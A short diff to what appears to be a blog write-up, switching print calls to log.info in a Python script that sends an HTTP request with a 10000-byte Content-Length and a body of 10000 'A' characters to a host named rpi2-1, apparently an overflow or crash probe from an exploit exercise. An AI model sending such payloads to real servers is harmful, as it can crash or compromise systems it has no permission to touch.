@@ -145,10 +145,10 @@ head = ["GET . HTTP/1.1",
         "Host: rpi2-1",
         "Content-Length: 10000"]
 
-print("[+] sending header")
+log.info("sending header")
 r.send(crlf.join(head) + crlf*2)
 
-print("[+] sending body")
+log.info("sending body")
 r.send("A"*10000)
 {% endhighlight %}
 
